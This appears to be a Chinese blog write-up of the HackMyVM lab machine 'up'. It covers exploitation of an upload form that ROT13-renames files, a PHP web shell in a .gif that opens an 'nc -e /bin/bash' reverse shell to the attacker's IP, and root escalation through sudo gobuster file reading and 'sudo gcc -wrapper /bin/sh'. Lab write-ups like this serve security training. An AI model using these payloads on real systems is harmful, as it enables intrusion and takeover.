---
{"dg-publish":true,"dg-path":"安全/靶机/hackmyvm_up.md","permalink":"/安全/靶机/hackmyvm_up/","title":"hackmyvm_up","tags":["blog"]}
---

# 主机发现

![Pasted image 20250131193302.png](/img/user/picture/Pasted%20image%2020250131193302.png)

只开了一个80端口

![Pasted image 20250131193530.png](/img/user/picture/Pasted%20image%2020250131193530.png)

# web渗透

![Pasted image 20250131193445.png](/img/user/picture/Pasted%20image%2020250131193445.png)
看着像是文件上传

![Pasted image 20250131193742.png](/img/user/picture/Pasted%20image%2020250131193742.png)

注意到有这么一个目录：
```txt
http://192.168.124.18/uploads/robots.txt
```

```shell
╭─ ~ ··································· ✔  took 1m 7s  with kongyu@parrot  at 14:36:41
╰─ curl http://192.168.124.18/uploads/robots.txt
PD9waHAKaWYgKCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddID09PSAnUE9TVCcpIHsKICAgICR0YXJnZXREaXIgPSAidXBsb2Fkcy8iOwogICAgJGZpbGVOYW1lID0gYmFzZW5hbWUoJF9GSUxFU1siaW1hZ2UiXVsibmFtZSJdKTsKICAgICRmaWxlVHlwZSA9IHBhdGhpbmZvKCRmaWxlTmFtZSwgUEFUSElORk9fRVhURU5TSU9OKTsKICAgICRmaWxlQmFzZU5hbWUgPSBwYXRoaW5mbygkZmlsZU5hbWUsIFBBVEhJTkZPX0ZJTEVOQU1FKTsKCiAgICAkYWxsb3dlZFR5cGVzID0gWydqcGcnLCAnanBlZycsICdnaWYnXTsKICAgIGlmIChpbl9hcnJheShzdHJ0b2xvd2VyKCRmaWxlVHlwZSksICRhbGxvd2VkVHlwZXMpKSB7CiAgICAgICAgJGVuY3J5cHRlZEZpbGVOYW1lID0gc3RydHIoJGZpbGVCYXNlTmFtZSwgCiAgICAgICAgICAgICdBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWmFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6JywgCiAgICAgICAgICAgICdOT1BRUlNUVVZXWFlaQUJDREVGR0hJSktMTW5vcHFyc3R1dnd4eXphYmNkZWZnaGlqa2xtJyk7CgogICAgICAgICRuZXdGaWxlTmFtZSA9ICRlbmNyeXB0ZWRGaWxlTmFtZSAuICIuIiAuICRmaWxlVHlwZTsKICAgICAgICAkdGFyZ2V0RmlsZVBhdGggPSAkdGFyZ2V0RGlyIC4gJG5ld0ZpbGVOYW1lOwoKICAgICAgICBpZiAobW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbImltYWdlIl1bInRtcF9uYW1lIl0sICR0YXJnZXRGaWxlUGF0aCkpIHsKICAgICAgICAgICAgJG1lc3NhZ2UgPSAiRWwgYXJjaGl2byBzZSBoYSBzdWJpZG8gY29ycmVjdGFtZW50ZS4iOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRtZXNzYWdlID0gIkh1Ym8gdW4gZXJyb3IgYWwgc3ViaXIgZWwgYXJjaGl2by4iOwogICAgICAgIH0KICAgIH0gZWxzZSB7CiAgICAgICAgJG1lc3NhZ2UgPSAiU29sbyBzZSBwZXJtaXRlbiBhcmNoaXZvcyBKUEcgeSBHSUYuIjsKICAgIH0KfQo/Pgo=

```


经base64解码后为
![Pasted image 20250131194103.png](/img/user/picture/Pasted%20image%2020250131194103.png)
这个大概就是`/index.php`文件的关键信息
简单来说就是将“文件基础名”进行ROT13加密，保存到`/uploads/`路径下

```shell
echo "<?php system('nc -e /bin/bash 192.168.124.10 1234'); ?>" > xbatlh.gif
```


![Pasted image 20250131200522.png](/img/user/picture/Pasted%20image%2020250131200522.png)


再去访问触发一下
![Pasted image 20250131200546.png](/img/user/picture/Pasted%20image%2020250131200546.png)

![Pasted image 20250131200554.png](/img/user/picture/Pasted%20image%2020250131200554.png)
就连进来


# 提权-1

首先先美化下shell
```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

export TERM=xterm
```

![Pasted image 20250131200902.png](/img/user/picture/Pasted%20image%2020250131200902.png)

首先这个文件夹下有一个“线索”
![Pasted image 20250131201003.png](/img/user/picture/Pasted%20image%2020250131201003.png)
提示了一个路径
```txt
/root/rodgarpass
```

看一下权限，有`/usr/bin/gobuster`权限
![Pasted image 20250131201053.png](/img/user/picture/Pasted%20image%2020250131201053.png)


看一下`etc/passwd`
```txt
cat /etc/passwd

...

rodgar:x:1001:1001::/home/rodgar:/bin/bash
```
emmm,不知道什么信息有用，至少知道一个用户名
```
rodgar
```

想起来前几天做的一个靶场[[blog/安全/靶机/hackmyvm_buster\|hackmyvm_buster]]
里面有利用gobuster读写任意文件的练习

```shell
sudo gobuster dir -w /root/rodgarpass -u http://192.168.124.10:8000
```

![Pasted image 20250131202013.png](/img/user/picture/Pasted%20image%2020250131202013.png)

也就是：
```txt
b45cffe084dd3d20d928bee85e7b0f2
```


![Pasted image 20250131202345.png](/img/user/picture/Pasted%20image%2020250131202345.png)


说实话这里没怎么弄懂
但是用户`rodgar`密码为
```txt
b45cffe084dd3d20d928bee85e7b0f21
```

看了别人的WP，发现`string`的md5加密值为
```
b45cffe084dd3d20d928bee85e7b0f21
```
也就是文件中获取的值是一个残缺的，正常的md5加密值长度为32字符



# 提权-2

看一下权限
![Pasted image 20250131202741.png](/img/user/picture/Pasted%20image%2020250131202741.png)


有gcc权限,[参考](https://gtfobins.github.io/gtfobins/gcc/)

![Pasted image 20250131202915.png](/img/user/picture/Pasted%20image%2020250131202915.png)
```shell
sudo gcc -wrapper /bin/sh,-s .
```


![Pasted image 20250131202936.png](/img/user/picture/Pasted%20image%2020250131202936.png)
完成



